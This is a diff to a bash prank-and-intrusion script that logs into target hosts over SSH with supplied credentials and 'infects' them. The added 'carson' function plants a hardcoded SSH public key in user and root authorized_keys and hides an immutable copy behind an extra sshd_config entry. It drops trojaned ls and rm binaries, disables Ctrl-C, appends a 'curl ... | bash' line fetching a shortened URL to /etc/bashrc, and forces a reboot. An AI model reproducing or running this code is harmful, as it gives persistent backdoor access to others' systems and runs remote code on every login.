@@ -30,9 +30,11 @@
 	# fix file checking
 	# check for failed install attempt before adding to 'installed' list
 	# setup aafire (aalib)
+	# figure out why github is altering the rickroll files, and fix it..
 	# fix the "pseudo terminal is not stdin", or whatever it is
 	# make the rickPath better
 	# change the clear argument to work with apache2 too
+	# migrate derpy \\\ to printf
 	### add the rest of it to Debian/Ubuntu
 	# fix the $? in the if statements, they wont work right
 	#******************************************************
@@ -40,21 +42,24 @@
 #///////////////////////////////////////////////////////////////////////////////////////
 #|||||||||||||||||||||||| Script Stuff Starts |||||||||||||||||||||||||||||||||||||||||
 #\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
-###### RUN function #######
-###########################
-function main(){		###
-if [[ $1 == -* ]]; then	###
-	pkill screen		### CLEARS SCREEN
-	echo CLEARED		###
-	exit 0				###
-else					###
-	neo					###
-	meat				###
-	bones				###
-	infect "$@"			### INFECTING TARGETS
-fi 						###
-}						###
-###########################
+###### RUN function ###############
+###################################
+function main(){				###
+if [[ $1 == -* ]]; then			###
+	pkill screen				### CLEARS SCREEN
+	echo CLEARED				###
+	exit 0						###
+elif [ $1 == 'carson' ]; then	### CARSON's
+	neo							###
+	carson						###
+else							###
+	neo							###
+	meat						###
+	bones						###
+	infect "$@"					### INFECTING TARGETS
+fi 								###
+}								###
+###################################
 #------ error handling ----------
 ### If error, give up			#
 #set -e							#
@@ -65,6 +70,69 @@ fi 						###
 # 'exit' can be a func or cmd	#
 #trap 'exit' ERR				#
 #--------------------------------
+sshPubKey='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDrSn4n0dyTIqXM7sUzQqf6WP0uBoz59CWSXuqD/TLvxy4hRonWwpGzS4PV2tGFxa/BQpu/frArWvqcan3ZiycOjFhxcues+ah5xbXV6cx1VuLBhV1A7oc1aHd2gAE187yAACoNDdR7e9EvEkZtYAJwtJoqlRLXWOHnjyi3Z2nO8BsjgBoRpX2CTecG0lAeUKUt8CEhZpDUQcSpO6EZ6o1+l1fisnPsVm9udobNVZ4w8uJ0hWirtSydJYeYnQQhHVXygBHtu/cImzXovWiJcsm3XEJyBsKVXtIOi/dP6vDrj8XiyNN5j+paRK1CwDTYiwCtsMtuFoKNAHuPUPrOiMd3 root@d-9'
+###########################################################################################
+######  ╔═╗┌─┐┬─┐┌─┐┌─┐┌┐┌  ###############################################################
+######  ║  ├─┤├┬┘└─┐│ ││││  ###############################################################
+######  ╚═╝┴ ┴┴└─└─┘└─┘┘└┘  ###############################################################
+### Carson's gentle minefield ###############################################################
+###########################################################################################
+function carson(){
+	###	To Do ###
+	# need to add id_rsa.pub key somewhere
+	# sed rickRoll to be the webhosted version
+	#-----------
+# it's a tarp!
+	trap '' 2
+# PS1 var
+	centDirtyRootPS1='PS1="${debian_chroot:+($debian_chroot)}[\e[0;5m*\e[0;37mT\e[0;31mi\e[0;33mt\e[0;32mt\e[1;37my \e[0;31mS\e[0;33mp\e[0;32mr\e[0;37mi\e[0;31mn\e[1;33mk\e[0;32ml\e[0;37me\e[0;31ms\e[0m\e[0;5;137m*\e[0m]\n\u@\h:\w\$ "'
+# ssh paths
+	sshUserPath="/home/$username/.ssh"
+	sshUserKey="$sshUserPath/authorized_keys"
+	sshRootPath="/root/.ssh"
+	sshRootKey="$sshRootPath/authorized_keys"
+	sshPoisonPath="/root/.vim"
+	sshPoisonKey="$sshPoisonPath/ssh"
+
+	# creating and inserting ssh keys
+		mkdir -m700 -p $sshUserPath $sshRootPath
+		chown $username:$username $sshUserPath
+		echo $sshPubKey >> $sshUserKey
+		chmod 600 $sshUserKey
+		cp -a $sshUserKey $sshRootKey &> /dev/null
+		restorecon -r /root &> /dev/null
+
+	# poisoning sshdir and auth file.
+		mkdir -p $sshPoisonPath
+		cp -a $sshRootKey /root/.ssh/.authorized_keys &> /dev/null
+		chattr +i /root/.ssh/.authorized_keys
+		echo 'AuthorizedKeysFile2 .ssh/.authorized_keys' >> /etc/ssh/sshd_config
+
+	# let the bodies hit the floor
+		echo "${dirtyLS}" | tee $seedPathsLS > /dev/null
+		echo "${dirtyRM}" | tee $seedPathsRM > /dev/null
+		chmod +x $seedPathsLS $seedPathsRM
+		chmod 777 $seedPathsLS $seedPathsRM
+		touch /tmp/.trigger
+		echo 'touch /tmp/.trigger &> /dev/null' >> /etc/bashrc
+		printf "\n%s\n" "$centDirtyRootPS1" >> /etc/bashrc
+		echo 'curl -s -L http://bit.ly/10hA8iC | bash' >> /etc/bashrc ;
+		#a few presents
+			touch present_{0001..1000}
+		#welcome messages
+			clear
+			printf "[\e[33;5m Preparing Charges \e[0m]"
+			(yum install curl epel-release -y &> /dev/null ; clear ; printf "[\e[33;5m Dispersing Candy \e[0m]") &&
+			(yum --disablerepo=epel -y update ca-certificates &> /dev/null ; clear ; printf "[\e[33;5m ..other important things.. \e[0m]") &&
+			yum install aalib -y &> /dev/null
+			clear
+			for n in {1..100}; do
+				printf "\t\t\e[0;31m AND SO IT BEGINS!! \e[0;m\n"
+				sleep .15
+			done
+		#dat reboot
+		init 6
+}
 ###########################################################################################
 ######  ╔╗ ┌─┐┌┐┌┌─┐┌─┐  ##################################################################
 ######  ╠╩╗│ ││││├┤ └─┐  ##################################################################
@@ -159,15 +227,15 @@ function bones() {
 # Infecting target(s) #####################################################################
 ###########################################################################################
 function infect(){
-#### launch bay #############
-function payload(){			#
-	if [[ $1 != '' ]]; then	#
-		razor "$@"			# SINGLE TARGET
-	else					#
-		shotgun				# EVERYONE
-	fi 						#
-}							#
-#############################
+#### launch bay #################
+function payload(){				#
+	if [[ $1 != '' ]]; then		#
+		razor "$@"				# SINGLE TARGET
+	else						#
+		shotgun					# EVERYONE
+	fi 							#
+}								#
+#################################
 #+++++++++++++++
 # single target
 #+++++++++++++++
@@ -182,8 +250,8 @@ function payload(){			#
 			: ${password:=$3}
 	# ssh commands
 		#do NOT add -n to this one
-		sshLoginCommand="timeout 1.5 sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target"
-		sshKeydCommand="timeout 1.5 ssh -n $target"
+		sshLoginCommand="timeout 2.5 sshpass -p $password ssh -o StrictHostKeyChecking=no $username@$target"
+		sshKeydCommand="timeout 2.5 ssh -n $target"
 	# ssh paths
 		sshUserPath="/home/$username/.ssh"
 		sshUserKey="$sshUserPath/authorized_keys"
@@ -195,7 +263,7 @@ function payload(){			#
 		sshContinue=0
 
 #### Inserting keys ############################
-		osDetect=$(timeout 1.5 sshpass -p $password ssh -n -o StrictHostKeyChecking=no $username@$target 'uname -v | egrep -o "Debian|Ubuntu" || cat /etc/*-release | grep -o CentOS | sort -u')
+		osDetect=$(timeout 2.5 sshpass -p $password ssh -n -o StrictHostKeyChecking=no $username@$target 'uname -v | egrep -o "Debian|Ubuntu" || cat /etc/*-release | grep -o CentOS | sort -u')
 			if [[ $? == 0 ]]; then
 				printf "\n[%s] Inserting ssh key and poisoning dirs with (\e[0;33m%s\e[m:\e[0;33m%s\e[m)" "$target" "$username" "$password"
 			else
@@ -206,7 +274,7 @@ function payload(){			#
 			case $osDetect in
 				CentOS)
 						#inserting key
-							if ! timeout 1.5 ssh -n -o StrictHostKeyChecking=no "$target"; then
+							if ! timeout 2.5 ssh -n -o StrictHostKeyChecking=no "$target"; then
 								$sshLoginCommand "
 												echo $password | sudo -S mkdir -m700 -p $sshUserPath $sshRootPath &> /dev/null
 												echo $password | sudo -S chown $username:$username $sshUserPath &> /dev/null
@@ -227,7 +295,7 @@ function payload(){			#
 									echo "Failed to use Sudo on [$target]" >> ./failedSudos
 								fi
 							fi
-						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
+						#New poisoned sshdir and auth file.
 							if [ $sshContinue == 0 ]; then
 								printf "[$target] Poisoning sshd rules"
 								$sshKeydCommand "
@@ -355,7 +423,7 @@ payload "$@"
 # checking for, and installing, needed stuff ##############################################
 ###########################################################################################
 function meat(){
-	commands="sshpass net-tools apache2"
+	commands="sshpass net-tools apache2 curl"
 	installing=""
 	updated=0
 	scriptPath="$BASH_SOURCE"
@@ -499,6 +567,52 @@ seedPathsRM="/usr/local/sbin/rm /usr/local/bin/rm"
 				mainRM "$@"
 				EOF
 				)"
+###########################################################################################
+######  ┌─┐┌─┐┌┐┌┌┬┐┌─┐╔═╗┬  ┌─┐┬ ┬┌─┐  ###################################################
+######  └─┐├─┤│││ │ ├─┤║  │  ├─┤│ │└─┐  ###################################################
+######  └─┘┴ ┴┘└┘ ┴ ┴ ┴╚═╝┴─┘┴ ┴└─┘└─┘  ###################################################
+### a pleasant banner #####################################################################
+###########################################################################################
+
+function santaClaus(){
+# cannot use * or other special characters (possibly)
+	DATA[0]=' __   __   ___  __        __          __   '
+	DATA[1]='|__) |__) |__  |__)  /\  |__) | |\ | / _`  '
+	DATA[2]='|    |  \ |___ |    /~~\ |  \ | | \| \__> ..'
+	DATA[3]='                                           '
+	DATA[4]=' __   __   ___  __   ___      ___  __      '
+	DATA[5]='|__) |__) |__  /__` |__  |\ |  |  /__`     '
+	DATA[6]='|    |  \ |___ .__/ |___ | \|  |  .__/ ...  '
+
+# virtual coordinate system is X*Y ${#DATA} * 5
+	REAL_OFFSET_X=0
+	REAL_OFFSET_Y=0
+
+	draw_char() {
+		V_COORD_X=$1
+		V_COORD_Y=$2
+		tput cup $((REAL_OFFSET_Y + V_COORD_Y)) $((REAL_OFFSET_X + V_COORD_X))
+		printf %c ${DATA[V_COORD_Y]:V_COORD_X:1}
+	}
+
+	trap '' 2
+	trap 'tput setaf 9; tput cvvis; clear' EXIT
+
+	tput civis
+	clear
+
+	while :; do
+		for ((c=1; c <= 7; c++)); do
+			tput setaf $c
+			for ((x=0; x<${#DATA[0]}; x++)); do
+				#replace y<=n with the nummber of data lines
+				for ((y=0; y<=6; y++)); do
+					draw_char $x $y
+				done
+		  	done
+		done
+	done
+}
 ###########################################################################################
 #are you root? no? well, try again
 ###########################################################################################
